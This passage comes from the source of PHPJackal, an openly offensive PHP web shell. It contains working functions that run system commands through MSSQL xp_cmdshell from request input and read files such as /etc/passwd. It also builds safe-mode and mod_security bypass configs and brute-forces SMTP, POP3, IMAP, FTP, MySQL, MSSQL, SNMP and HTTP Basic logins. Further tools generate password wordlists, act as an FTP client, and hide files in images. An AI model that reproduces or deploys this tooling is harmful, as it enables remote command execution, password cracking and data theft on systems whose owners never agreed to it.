		mssql_select_db ( $_REQUEST ['dB'], $db );
		mssql_query ( "create table $tb ( string VARCHAR (500) NULL)", $db );
		mssql_query ( "insert into $tb EXEC master.dbo.xp_cmdshell '" . $_REQUEST ['coM'] . "'", $db );
		$re = mssql_query ( "select * from $tb", $db );
		while ( ($row = mssql_fetch_row ( $re )) ) {
			$res .= $row [0] . "\r\n";
		}
		mssql_query ( "drop table $tb", $db );
		mssql_close ( $db );
		echo "<div align=center><textarea rows='18' cols='64'>$res</textarea></div><br>";
	}
	$f = (! empty ( $_REQUEST ['file'] )) ? htmlspecialchars ( $_REQUEST ['file'] ) : '/etc/passwd';
	$u = (! empty ( $_REQUEST ['user'] )) ? htmlspecialchars ( $_REQUEST ['user'] ) : 'root';
	$p = (! empty ( $_REQUEST ['pass'] )) ? htmlspecialchars ( $_REQUEST ['pass'] ) : '123456';
	$d = (! empty ( $_REQUEST ['db'] )) ? htmlspecialchars ( $_REQUEST ['db'] ) : 'test';
	echo '
<form name="client" method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">Disable safe-mode & mod_sec</label>
</div><div class="fieldwrapper">
<label class="styled">Create config files:</label>
<div class="thefield">
php.ini<br />
ini.ini<br />
.htaccess<br />
</div>
</div>' . $hcwd . '<div class="buttonsdiv">
<input type="submit" name="create" value="Create" style="margin-left: 150px;" />
</div>
</form>
<br />
<form name="client" method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">Use PHP Bugs</label>
</div><div class="fieldwrapper">
<label class="styled">File:</label>
<div class="thefield">
<input type="text" name="file" value="' . $f . '" size="30" />
</div>
</div>' . $hcwd . '<div class="buttonsdiv">
<input type="submit" name="read" value="Read File" style="margin-left: 150px;" />
</div>
<div class="buttonsdiv">
<input type="submit" name="show" value="List directory" style="margin-left: 150px;" />
</div>
</form>
<br />
<form name="client1" method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">Use MySQL</label>
</div><div class="fieldwrapper">
<label class="styled">File:</label>
<div class="thefield">
<input type="text" name="file" value="' . $f . '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="user" value="' . $u . '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name="pass" value="' . $p . '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Database:</label>
<div class="thefield">
<input type="text" name="db" value="' . $d . '" size="30" />
</div>
</div>' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" name="sql" value="Read" style="margin-left: 150px;" />
</div>
</form>
<br />
<form name="client2" method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">MSSQL Exec</label>
</div><div class="fieldwrapper">
<label class="styled">Server:</label>
<div class="thefield">
<input type="text" name="serveR" value="';
	if (! empty ( $_REQUEST ['serveR'] ))
		echo htmlspecialchars ( $_REQUEST ['serveR'] );
	else
		echo 'localhost';
	echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="useR" value="';
	if (! empty ( $_REQUEST ['useR'] ))
		echo htmlspecialchars ( $_REQUEST ['useR'] );
	else
		echo 'sa';
	echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name="pasS" value="';
	if (! empty ( $_REQUEST ['pasS'] ))
		echo htmlspecialchars ( $_REQUEST ['pasS'] );
	echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Command:</label>
<div class="thefield">
<input type="text" name="coM" value="';
	if (! empty ( $_REQUEST ['coM'] ))
		echo htmlspecialchars ( $_REQUEST ['coM'] );
	else
		echo 'dir c:';
	echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Database:</label>
<div class="thefield">
<input type="text" name="dB" value="';
	if (! empty ( $_REQUEST ['dB'] ))
		echo htmlspecialchars ( $_REQUEST ['dB'] );
	else
		echo 'master';
	echo '" size="30" />
</div>
</div>' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" value="Execute" style="margin-left: 150px;" />
</div>
</form>
';
}
function crackeR() {
	global $hcwd, $cwd, $Resource_Dir;
	if (! empty ( $_REQUEST ['cracK'] ) && empty ( $_REQUEST ['target'] )) {
		$c = htmlspecialchars ( $_REQUEST ['cracK'] );
		echo '<form name=cracker method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">' . $c . ' cracker</label>
</div>
<div class="fieldwrapper"><label class="styled">Target:</label><div class="thefield"><input type="text" name="target" value="localhost" size="30" /></div></div>
<div class="fieldwrapper"><label class="styled">Username/Userlist:</label><div class="thefield"><input type=text name="user" size=20 value=""></div></div>
<div class="fieldwrapper"><label class="styled">Password:</label><div class="thefield">
<select name="mode" id="mode" onChange="toggle()">
<option value="09">Bruteforce [0-9]</option>
<option value="az">Bruteforce [a-z]</option>
<option value="az09">Bruteforce [a-z] [0-9]</option>
<option value="az09AZ">Bruteforce [a-z] [A-Z] [0-9]</option>
<option value="all">Bruteforce [ALL]</option>
<option value="sau">Same as username</option>
<option value="wl">Wordlist</option>
</select>
</div></div>
<div class="fieldwrapper" id="dic">
<label class="styled">Wordlist:</label>
<div class="thefield">
<input type="text" name="dictionary" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled"><input type=checkbox name=loG value=1 onClick="document.cracker.logfilE.disabled = !document.cracker.logfilE.disabled;" checked> Log:</label>
<div class="thefield">
<input type=text name=logfilE size=25 value="' . whereistmP () . DIRECTORY_SEPARATOR . '.log">
</div>
</div>
' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" value="Start" style="margin-left: 150px;" />
</div>
</form><script type="text/JavaScript">
toggle();
</script>';
	} elseif (! empty ( $_REQUEST ['cracK'] ) && ! empty ( $_REQUEST ['target'] )) {
		$pro = strtolower ( $_REQUEST ['cracK'] ) . 'checK';
		$target = $_REQUEST ['target'];
		$type = (! empty ( $_REQUEST ['combo'] )) ? $_REQUEST ['combo'] : 0;
		$user = (! empty ( $_REQUEST ['user'] )) ? $_REQUEST ['user'] : '';

		if (isset ( $_REQUEST ['loG'] ) && ! empty ( $_REQUEST ['logfilE'] )) {
			$log = 1;
			$file = $_REQUEST ['logfilE'];
		} else
			$log = 0;
		$users = array ();
		if (! file_exists ( $_REQUEST ['user'] ))
			$users [] = $user;
		else
			$users = file ( $_REQUEST ['user'] );
		echo '<font color=#FA0>Cracking ' . htmlspecialchars ( $target ) . '...<br />';
		@flush_buffers ();
		foreach ( $users as $u ) {
			$u = trim ( $u );
			if ($_REQUEST ['mode'] == 'wl' || $_REQUEST ['mode'] == 'sau') {
				if ($_REQUEST ['mode'] == 'wl') {
					$dictionary = fopen ( $_REQUEST ['dictionary'], 'r' );
					if ($dictionary) {
						while ( ! feof ( $dictionary ) ) {
							$pass = fgets ( $dictionary );
							$pass = trim ( $pass );
							$ret = $pro ( $target, $u, $pass, 5 );
							if ($ret == - 1) {
								echo "Can not connect to server.";
								break 2;
							} elseif ($ret) {
								$x = "U: $u P: $pass";
								if($pro=="ftpchecK")$x='<a href="'.hlinK("seC=ftpc&hosT=$target&useR=$u&pasS=$pass").'">'.$x.'</a>';
								echo "$x<br />";
								@flush_buffers ();
								fclose ( $dictionary );
								if ($log)
									file_add_contentS ( $file, "$x\r\n" );
								break;
							}
						}
					}
				} elseif ($_REQUEST ['mode'] == 'sau') {
					$ret = $pro ( $target, $u, $u, 5 );
					if ($ret == - 1) {
						echo "Can not connect to server.";
						break;
					} elseif ($ret) {
						$x = "U: $u P: $u";
						if($pro=="ftpchecK")$x='<a href="'.hlinK("seC=ftpc&hosT=$target&useR=$u&pasS=$u").'">'.$x.'</a>';
						echo "$x<br />";
						@flush_buffers ();
						if ($log)
							file_add_contentS ( $file, "$x\r\n" );
					}
				} else {
					echo "Can not open dictionary.";
				}
			} else {
				$code = '$test=' . $pro . '("' . $target . '","' . $u . '",$word, 5);';
				if ($res = brute ( $_REQUEST ['mode'], $_REQUEST ['min'], $_REQUEST ['max'], $code ) != null)
					$x= "U: $u P: $res<br />";
					if($pro=="ftpchecK")$x='<a href="'.hlinK("sec=ftpC&hosT=$target&useR=$u&pasS=$res").'">'.$x.'</a>';
					echo "$x<br />";
				if ($log)
					file_add_contentS ( $file, "$x\r\n" );
			}
		}
		echo "<br />Done.</font>";
	} else {
		echo '<a href="' . hlinK ( "seC=hc&workingdiR=$cwd" ) . '"> Hash</a><br /><br />
<a href="' . hlinK ( "seC=cr&cracK=SMTP&workingdiR=$cwd" ) . '"> SMTP</a><br /><br />
<a href="' . hlinK ( "seC=cr&cracK=POP3&workingdiR=$cwd" ) . '"> POP3</a><br /><br />
<a href="' . hlinK ( "seC=cr&cracK=IMAP&workingdiR=$cwd" ) . '"> IMAP</a><br /><br />
<a href="' . hlinK ( "seC=cr&cracK=FTP&workingdiR=$cwd" ) . '"> FTP</a><br /><br />
<a href="' . hlinK ( "seC=snmp&workingdiR=$cwd" ) . '"> SNMP</a><br /><br />
<a href="' . hlinK ( "seC=cr&cracK=MySQL&workingdiR=$cwd" ) . '"> MySQL</a><br /><br />
<a href="' . hlinK ( "seC=cr&cracK=MSSQL&workingdiR=$cwd" ) . '"> MSSQL</a><br /><br />
<a href="' . hlinK ( "seC=fcr&workingdiR=$cwd" ) . '"> HTTP Form</a><br /><br />
<a href="' . hlinK ( "seC=auth&workingdiR=$cwd" ) . '"> HTTP Auth(basic)</a><br /><br />
<a href="' . hlinK ( "seC=dic&workingdiR=$cwd" ) . '"> Dictionary maker</a><br /><br />';
	}
}
function phpjackal() {
	global $VERSION, $cwd;
	if (! empty ( $_REQUEST ['chkveR'] )) {
		$res = getiT ( $Resource_Dir . "chkver.txt", $headers);
		if ($res)
			if(trim($res) != $VERSION)echo 'New version available!'; else echo 'PHPJackal is already uptodate.';
		else
			echo 'Can not connect to server! Please check version manually from <a href="https://github.com/nim4/PHPJackal/" target="_blank">https://github.com/nim4/PHPJackal/</a>';
	} else
		echo '<ul><li><a href="' . hlinK ( "seC=phpjackal&workingdiR=$cwd&chkveR=1" ) . '">Check version</a></li><li><a href="#" onclick="if(confirm(\'Are you sure?\'))window.location=\'' . hlinK ( "seC=phpjackal&workingdiR=$cwd&slfrmv=1" ) . '\';">Self removal</a></li></ul>';
}
function snmpcrackeR() {
	global $hcwd;
	if (! empty ( $_REQUEST ['target'] ) && ! empty ( $_REQUEST ['dictionary'] )) {
		$target = $_REQUEST ['target'];
		if (isset ( $_REQUEST ['loG'] ) && ! empty ( $_REQUEST ['logfilE'] )) {
			$log = 1;
			$file = $_REQUEST ['logfilE'];
		} else
			$log = 0;
		$dictionary = fopen ( $_REQUEST ['dictionary'], 'r' );
		if ($dictionary) {
			echo '<font color=#FA0>Cracking ' . htmlspecialchars ( $target ) . '...<br>';
			while ( ! feof ( $dictionary ) ) {
				$com = trim ( fgets ( $dictionary ), " \n\r" );
				$res = snmpchecK ( $target, $com, 2 );
				if ($res) {
					echo "$com<br>";
					if ($log)
						file_add_contentS ( $file, "$com\r\n" );
				}
			}
			echo '<br>Done</font>';
			fclose ( $dictionary );
		} else {
			echo "Can not open dictionary.";
		}
	} else
		echo '<form name=cracker method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">SNMP cracker</label>
</div><div class="fieldwrapper">
<label class="styled">Dictionary:</label>
<div class="thefield">
<input type="text" name="dictionary" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Target:</label>
<div class="thefield">
<input type="text" name="target" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled"><input type=checkbox name=loG value=1 onClick="document.hashform.logfilE.disabled = !document.cracker.logfilE.disabled;" checked> Log:</label>
<div class="thefield">
<input type=text name=logfilE size=25 value="' . whereistmP () . DIRECTORY_SEPARATOR . '.log">
</div>
</div>
' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" value="Start" style="margin-left: 150px;" />
</div>
</form>';
}
$CheckedLinks = $GrabedWords = array ();
function Site2profile($urL, $level) {
	global $CheckedLinks, $GrabedWords;
	echo ".";
	@flush_buffers ();
	if ($level == 0)
		return 0;
	if (in_array ( $urL, $CheckedLinks ))
		return null;
    $headers = array();
    $con = getiT ( $urL , $headers);
	if (! strstr ( $headers['Content-Type'], 'text/' ))
		return null;
	$CheckedLinks [] = $urL;
	$u = parse_url ( $urL );
	$file = (! empty ( $u ['path'] )) ? $u ['path'] : '/';
	$port = (! empty ( $u ['port'] )) ? ":" . $u ['port'] : '';
	$dir = str_replace ( DIRECTORY_SEPARATOR, '/', dirname ( $file ) );
	$txt = strip_tags ( $con );
	$txt = str_replace ( "\n", " ", $txt );
	$twords = explode ( " ", $txt );
	foreach ( $twords as $word ) {
		$word = trim ( $word );
		if ($word && ! in_array ( $word, $GrabedWords ))
			$GrabedWords [] = trim ( $word );
	}
	$dom = new DOMDocument ( );
	@$dom->loadHTML ( $con );
	$dom->preserveWhiteSpace = false;
	$xpath = new DOMXPath ( $dom );
	$hrefs = $xpath->evaluate ( "/html/body//a" );
	for($i = 0; $i < $hrefs->length; $i ++) {
		$href = $hrefs->item ( $i );
		$url = $href->getAttribute ( 'href' );
		if (! empty ( $url )) {
			$pre = '';
			if (substr ( $url, 0, 4 ) != 'http') {
				$pre = $u ['scheme'] . "://" . $u ['host'] . $port;
				if ($url {0} != '/')
					$pre .= $dir;
			}
			$url = $pre . $url;
			Site2profile ( $url, $level - 1 );
		}
	}
}
function dicmakeR() {
	global $windows, $hcwd, $CheckedLinks, $GrabedWords;
	$combo = (empty ( $_REQUEST ['combo'] )) ? 0 : 1;
	if (! empty ( $_REQUEST ['range'] ) && ! empty ( $_REQUEST ['output'] ) && ! empty ( $_REQUEST ['min'] ) && ! empty ( $_REQUEST ['max'] )) {
		$min = $_REQUEST ['min'];
		$max = $_REQUEST ['max'];
		if ($max < $min) {
			echo "Bad input!";
			return;
		}
		;
		$s = $w = '';
		$out = $_REQUEST ['output'];
		$r = $_REQUEST ['range'];
		$dic = fopen ( $out, 'w' );
		if ($r == 1) {
			for($s = pow ( 10, $min - 1 ); $s < pow ( 10, $max - 1 ); $s ++) {
				$w = $s;
				if ($combo)
					$w = "$w:$w";
				fwrite ( $dic, $w . "\n" );
			}
		} else {
			$s = str_repeat ( $r, $min );
			while ( strlen ( $s ) < $max ) {
				$w = $s;
				if ($combo)
					$w = "$w:$w";
				fwrite ( $dic, $w . "\n" );
				$s ++;
			}
		}
		fclose ( $dic );
		echo '<font color=#FA0>Done</font>';
	} elseif (! empty ( $_REQUEST ['input'] ) && ! empty ( $_REQUEST ['output'] )) {
		$input = fopen ( $_REQUEST ['input'], 'r' );
		if (! $input) {
			if ($windows)
				echo 'Unable to read from ' . htmlspecialchars ( $_REQUEST ['input'] ) . "<br />";
			else {
				$input = explode ( "\n", shelL ( "cat $input" ) );
				$output = fopen ( $_REQUEST ['output'], 'w' );
				if ($output) {
					foreach ( $input as $in ) {
						$user = $in;
						$user = trim ( fgets ( $in ), " \n\r" );
						if (! strstr ( $user, ':' ))
							continue;
						$user = substr ( $user, 0, (strpos ( $user, ':' )) );
						if ($combo)
							fwrite ( $output, $user . ':' . $user . "\n" );
						else
							fwrite ( $output, $user . "\n" );
					}
					fclose ( $input );
					fclose ( $output );
					echo '<font color=#FA0>Done</font>';
				}
			}
		} else {
			$output = fopen ( $_REQUEST ['output'], 'w' );
			if ($output) {
				while ( ! feof ( $input ) ) {
					$user = trim ( fgets ( $input ), " \n\r" );
					if (! strstr ( $user, ':' ))
						continue;
					$user = substr ( $user, 0, (strpos ( $user, ':' )) );
					if ($combo)
						fwrite ( $output, $user . ':' . $user . "\n" );
					else
						fwrite ( $output, $user . "\n" );
				}
				fclose ( $input );
				fclose ( $output );
				echo '<font color=#FA0>Done</font>';
			} else
				echo 'Unable to write data to ' . htmlspecialchars ( $_REQUEST ['input'] ) . "<br />";
		}
	} elseif (! empty ( $_REQUEST ['url'] ) && ! empty ( $_REQUEST ['output'] )) {
		$res = downloadiT ( $_REQUEST ['url'], $_REQUEST ['output'] );
		if ($combo && $res) {
			$file = file ( $_REQUEST ['output'] );
			$output = fopen ( $_REQUEST ['output'], 'w' );
			foreach ( $file as $v )
				fwrite ( $output, "$v:$v\n" );
			fclose ( $output );
		}
		echo '<font color=#FA0>Done</font>';
	} elseif (! empty ( $_REQUEST ['url'] ) && ! empty ( $_REQUEST ['pout'] ) && ! empty ( $_REQUEST ['lvl'] )) {
		$url = $_REQUEST ['url'];

		echo '<font color=#FA0>Please wait';
		@flush_buffers ();
		Site2profile ( $url, $_REQUEST ['lvl'] );
		$output = fopen ( $_REQUEST ['pout'], 'w' );
		if ($output) {
			foreach ( $GrabedWords as $word )
				fwrite ( $output, "$word\n" );
			echo '<br /><br />Done!';
		} else
			echo 'Can not write to file!';
		echo '</font>';
	} else {
		$temp = whereistmP () . DIRECTORY_SEPARATOR;
		echo '<form name=dldic method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Website profiler</label>
</div><div class="fieldwrapper"><label class="styled">URL:</label><div class="thefield"><input type="url" name="url" value="http://' . getenv ( 'HTTP_HOST' ) . '/" size="30" />
</div></div><div class="fieldwrapper"><label class="styled">Output:</label><div class="thefield"><input type="text" name="pout" value="' . $temp . '.dic" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Level:</label><div class="thefield"><input type="number" min="1" name=lvl value=3></div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" value="Get" name="profile" style="margin-left: 150px;" /></div></form><br /><form name=wordlist method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Wordlist generator</label>
</div><div class="fieldwrapper"><label class="styled">Range:</label><div class="thefield"><select name=range><option value=a>a-z</option><option value=A>A-Z</option><option value=1>0-9</option></select>
</div></div><div class="fieldwrapper"><label class="styled">min lenght:</label><div class="thefield"><select name=min><option value=1>1</option><option value=2>2</option><option value=3>3</option><option value=4>4</option><option value=5>5</option><option value=6>6</option><option value=7>7</option><option value=8>8</option><option value=9>9</option><option value=10>10</option></select></div>
</div><div class="fieldwrapper"><label class="styled">Max lenght:</label><div class="thefield"><select name=max><option value=2>2</option><option value=3>3</option><option value=4>4</option><option value=5>5</option><option value=6>6</option><option value=7>7</option><option value=8>8</option><option value=9>9</option><option value=10>10</option><option value=11>11</option></select></div>
</div><div class="fieldwrapper"><label class="styled">Output:</label><div class="thefield"><input type="text" name="output" value="' . $temp . '.dic" size="30" /></div>
</div><div class="fieldwrapper"><label class="styled">Format:</label><div class="thefield"><input type=checkbox name=combo value=1 checked> Combo style output
</div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" value="Make" style="margin-left: 150px;" /></div></form><br /><form name=grab method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Grab dictionary</label></div><div class="fieldwrapper"><label class="styled">Input:</label><div class="thefield"><input type="text" name="input" value="/etc/passwd" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Output:</label><div class="thefield"><input type="text" name="output" value="' . $temp . '.dic" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Format:</label><div class="thefield"><input type=checkbox name=combo value=1 checked> Combo style output</div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" value="Grab" style="margin-left: 150px;" />
</div></form><br /><form name=dldic method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Download dictionary</label>
</div><div class="fieldwrapper"><label class="styled">URL:</label><div class="thefield"><input type="url" name="url" value="http://people.sc.fsu.edu/~jburkardt/datasets/words/wordlist.txt" size="30" />
</div></div><div class="fieldwrapper"><label class="styled">Output:</label><div class="thefield"><input type="text" name="output" value="' . $temp . '.dic" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Format:</label><div class="thefield"><input type=checkbox name=combo value=1 checked> Combo style output</div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" value="Get" style="margin-left: 150px;" /></div></form><br />';
	}
}
function ftpclienT() {
	global $cwd, $hcwd;
	if (! empty ( $_REQUEST ['hosT'] ) && ! empty ( $_REQUEST ['useR'] ) && isset ( $_REQUEST ['pasS'] ) && checkfunctioN ( 'ftp_connect' )) {
		$user = $_REQUEST ['useR'];
		$pass = $_REQUEST ['pasS'];
		$host = $_REQUEST ['hosT'];
		$con = ftp_connect ( $_REQUEST ['hosT'], 21, 10 );
		if ($con) {
			if (ftp_login ( $con, $user, $pass )) {
				if (! empty ( $_REQUEST ['PWD'] ))
					ftp_chdir ( $con, $_REQUEST ['PWD'] );
				if (! empty ( $_REQUEST ['filE'] )) {
					$file = $_REQUEST ['filE'];
					$mode = (isset ( $_REQUEST ['modE'] )) ? FTP_BINARY : FTP_ASCII;
					if (isset ( $_REQUEST ['geT'] ))
						ftp_get ( $con, $file, $file, $mode );
					elseif (isset ( $_REQUEST ['puT'] ))
						ftp_put ( $con, $file, $file, $mode );
					elseif (isset ( $_REQUEST ['rM'] )) {
						ftp_rmdir ( $con, $file );
						ftp_delete ( $con, $file );
					} elseif (isset ( $_REQUEST ['mD'] ))
						ftp_mkdir ( $con, $file );
				}
				$pwd = ftp_pwd ( $con );
				$dir = ftp_rawlist($con, '-la .');
				$d = opendir ( $cwd );
				echo "<table border=0 cellspacing=0 cellpadding=0><tr><th>$host</th><th>";
				if (! empty ( $_SERVER ['SERVER_ADDR'] ))
					echo $_SERVER ['SERVER_ADDR'];
				else
					echo '127.0.0.1';
				echo "</th></tr><form method=POST><tr><td><input type=text value='$pwd' name=PWD size=50><input value=Change class=buttons type=submit></td><td><input size=50 type=text value='$cwd' name=workingdiR><input value=Change class=buttons type=submit></td></tr><tr><td>";
				foreach ( $dir as $n )
					echo "$n<br />";
				echo "</td><td>";
				while ( $cdir = readdir ( $d ) )
					if ($cdir != '.' && $cdir != '..')
						echo "$cdir<br>";
				echo "</td></tr><tr><td colspan=2>Name:<input type=text name=filE><input type=checkbox style='border-width:1px;background-color:#333333;' name=modE value=1>Binary <input type=submit name=geT class=buttons value=Get><input type=submit name=puT class=buttons value=Put><input type=submit name=rM class=buttons value=Remove><input type=submit name=mD class=buttons value='Make dir'></td><td><input type=hidden value='$user' name=useR><input type=hidden value='$pass' name=pasS><input type=hidden value='$host' name=hosT></form></tr></td></table>";
			} else
				echo "Wrong username or password!";
		} else
			echo "Can not connect to server!";
	} else {
		echo '
<form name=client method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">FTP client</label>
</div><div class="fieldwrapper">
<label class="styled">Server:</label>
<div class="thefield">
<input type="text" name="hosT" value="localhost" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="useR" value="anonymous" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name="pasS" value="admin@nasa.gov" size="30" />
</div>
</div>
' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" value="Connect" style="margin-left: 150px;" />
</div></form>';
	}
}
function calC() {
	global $hcwd;
	$fu = array ('-', 'md5', 'sha1', 'crc32', 'hex', 'ip2long', 'decbin', 'dechex', 'hexdec', 'bindec', 'long2ip', 'base64_encode', 'base64_decode', 'urldecode', 'urlencode', 'des', 'strrev', 'strlen' );
	if (! empty ( $_REQUEST ['input'] ) && (in_array ( $_REQUEST ['to'], $fu ))) {
		$to = $_REQUEST ['to'];
		echo '<form class="form" method="POST">';
		echo '<div class="fieldwrapper">
<label class="styled">Output:</label>
<div class="thefield"><textarea readonly="readonly">';
		if ($to == 'hex')
			for($i = 0; $i < strlen ( $_REQUEST ['input'] ); $i ++)
				echo '%' . strtoupper ( dechex ( ord ( $_REQUEST ['input'] {$i} ) ) );
		else
			echo $to ( $_REQUEST ['input'] );
		echo '</textarea></div></div>';
	}
	echo '
<form method="POST" class="form">
<div class="fieldwrapper">
<label class="styled">Input:</label>
<div class="thefield">
<textarea name="input">';
	if (! empty ( $_REQUEST ['input'] ))
		echo htmlspecialchars ( $_REQUEST ['input'] );
	echo '</textarea>
</div>
</div><div class="fieldwrapper">
<label class="styled">Function:</label>
<div class="thefield">
<select name="to">
<option value="md5">MD5</option>
<option value="sha1">SHA1</option>
<option value="crc32">Crc32</option>
<option value="strrev">Reverse</option>
<option value="ip2long">IP to long</option>
<option value="strlen">Lenght</option>
<option value="long2ip">Long to IP</option>
<option value="decbin">Decimal to binary</option>
<option value="bindec">Binary to decimal</option>
<option value="dechex">Decimal to hex</option>
<option value="hexdec">Hex to decimal</option>
<option value="hex">ASCII to hex</option>
<option value="urlencode">URL encoding</option>
<option value="urldecode">URL decoding</option>
<option value="base64_encode">Base64 encoding</option>
<option value="base64_decode">Base64 decoding</option>
</select>
</div>
</div>' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" value="Convert" style="margin-left: 150px;" />
</div>
</form>';
}
function stegn0() {
	global $hcwd;
	if (! extension_loaded ( 'gd' )) {
		echo "GD extension is not installed. You can't use this section without it.";
		return;
	}
	if (! empty ( $_REQUEST ['maskimagE'] ) && ! empty ( $_REQUEST ['hidefilE'] ) && ! empty ( $_REQUEST ['outfilE'] )) {
		echo stegfilE ( $_REQUEST ['maskimagE'], $_REQUEST ['hidefilE'], $_REQUEST ['outfilE'] );
	} elseif (! empty ( $_REQUEST ['revimagE'] )) {
		echo steg_recoveR ( ($_REQUEST ['revimagE']) );
	} else
		echo '
<form name=stegn method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">Steganographer</label>
</div><div class="fieldwrapper">
<label class="styled">Mask image: (JPEG)</label>
<div class="thefield">
<input type="text" name="maskimagE" value="banner.jpg" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">File to hide:</label>
<div class="thefield">
<input type="text" name="hidefilE" value="pass.lst" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Outout: (PNG)</label>
<div class="thefield">
<input type="text" name="outfilE" value="banner.png" size="30" />
</div>
</div>
' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" name="stegn0" value="Combine" style="margin-left: 150px;" />
</div>
</form>
<br />
<form name=rev method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">Reveal</label>
</div><div class="fieldwrapper">
<label class="styled">Steganographed image: (PNG)</label>
<div class="thefield">
<input type="text" name="revimagE" value="banner.png" size="30" />
</div>
</div>
' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" name="stegn0" value="Reveal" style="margin-left: 150px;" />
</div>
</form>';
}
function authcrackeR() {
	global $hcwd;
	if (! empty ( $_REQUEST ['target'] )) {
		if (isset ( $_REQUEST ['loG'] ) && ! empty ( $_REQUEST ['logfilE'] )) {
			$log = 1;
			$file = $_REQUEST ['logfilE'];
		} else
			$log = 0;
		$data = '';
		$method = ($_REQUEST ['method']) ? 'POST' : 'GET';
		if (strstr ( $_REQUEST ['target'], '?' )) {
			$data = substr ( $_REQUEST ['target'], strpos ( $_REQUEST ['target'], '?' ) + 1 );
			$_REQUEST ['target'] = substr ( $_REQUEST ['target'], 0, strpos ( $_REQUEST ['target'], '?' ) );
		}
		$u = parse_url ( $_REQUEST ['target'] );
		$host = $u ['host'];
		$page = $u ['path'];
		$type = $_REQUEST ['combo'];
		$user = (! empty ( $_REQUEST ['user'] )) ? $_REQUEST ['user'] : '';
		if ($method == 'GET')
			$page .= $data;
		echo '<font color=#FA0>';
		if ($_REQUEST ['mode'] == 'wl') {
			$dictionary = fopen ( $_REQUEST ['dictionary'], 'r' );
			while ( ! feof ( $dictionary ) ) {
				if ($type) {
					$combo = trim ( fgets ( $dictionary ), " \n\r" );
					$user = substr ( $combo, 0, strpos ( $combo, ':' ) );
					$pass = substr ( $combo, strpos ( $combo, ':' ) + 1 );
				} else {
					$pass = trim ( fgets ( $dictionary ), " \n\r" );
				}
				$so = @fsockopen ( $host, 80, $en, $es, 5 );
				if (! $so) {
					echo "Can not connect to host";
					break;
				} else {
					$packet = "$method $page HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nConnection: Close\r\nAuthorization: Basic " . base64_encode ( "$user:$pass" );
					if ($method == 'POST')
						$packet .= 'Content-Type: application/x-www-form-urlencoded\r\nContent-Length: ' . strlen ( $data );
					$packet .= "\r\n\r\n";
					$packet .= $data;
					fputs ( $so, $packet );
					$res = substr ( fgets ( $so ), 9, 2 );
					fclose ( $so );
					if ($res == '20') {
						echo "U: $user P: $pass</br>";
						if ($log)
							file_add_contentS ( $file, "U: $user P: $pass\r\n" );
					}
				}
			}
		} else {
			$code = '
			$so = @fsockopen ( "' . $host . '", 80, $en, $es, 5 );
			$packet = "' . $method . " $page " . 'HTTP/1.0\r\nAccept-Encoding: text\r\nHost: ' . $host . '\r\nReferer: ' . $host . '\r\nConnection: Close\r\nAuthorization: Basic "
			. base64_encode ( "' . $user . ':".$word )."\r\n"';
			if ($method == "POST")
				$code .= ".'Content-Type: application/x-www-form-urlencoded\r\nContent-Length: " . strlen ( "'$data'" ) . "'";
			$code .= "\r\n\r\n" . $data . ';fputs ( $so, $packet );	$test= ( substr ( fgets ( $so ), 9, 2 ) == "20");';
			echo $code;
			if ($res = brute ( $_REQUEST ['mode'], $_REQUEST ['min'], $_REQUEST ['max'], $code ) != null)
				echo "<b>$user:$res</b><br />";

		}
		echo 'Done!</font>';
	} else
		echo '
<form name=cracker method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">HTTP Auth cracker</label>
</div><div class="fieldwrapper">
<label class="styled">Target:</label>
<div class="thefield">
<input type="url" name="target" value="http://' . getenv ( 'HTTP_HOST' ) . '/admin/" size="30" />
</div>
</div>
<div class="fieldwrapper"><label class="styled">Input:</label><div class="thefield">
<select name="mode" id="mode" onChange="toggle()">
<option value="09">Bruteforce [0-9]</option>
<option value="az">Bruteforce [a-z]</option>
